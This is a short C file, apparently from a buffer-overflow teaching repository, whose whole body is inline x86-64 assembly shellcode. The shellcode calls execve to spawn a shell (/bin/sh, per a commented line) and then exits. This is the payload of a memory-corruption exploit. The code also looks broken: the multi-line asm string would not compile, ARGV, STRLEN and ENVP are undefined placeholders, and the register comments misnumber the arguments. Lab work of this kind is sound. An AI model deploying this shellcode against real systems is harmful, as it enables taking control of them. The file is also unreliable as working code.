/* victim.c */
/* Author: Zecheng He @ Princeton University */
/* Modified from https://github.com/npapernot/buffer-overflow-attack to support 64-bit machines*/

#include <sys/syscall.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    __asm__("
        popq    %rcx
        movq    %rcx,(ARGV)(%rcx)       /* set up argv pointer to pathname */
        xorq    %rax,%rax               /* get a 64-bit zero value */
        movb    %al,(STRLEN)(%rcx)      /* null-terminate our string */
        movq    %rax,(ENVP)(%rcx)       /* set up null envp */

        movb    $SYS_execve,%al         /* syscall arg 1: syscall number */
        movq    %rcx,%rdi               /* syscall arg 2: string pathname */
        leaq    ARGV(%rcx),%rsi         /* syscall arg 2: argv */
        leaq    ENVP(%rcx),%rdx         /* syscall arg 3: envp */
        syscall                         /* invoke syscall */

        movb    $SYS_exit,%al           /* syscall arg 1: SYS_exit (60) */
        xorq    %rdi,%rdi               /* syscall arg 2: 0 */
        syscall                         /* invoke syscall */
    ");

    //execv("/bin/sh", NULL, NULL);
}
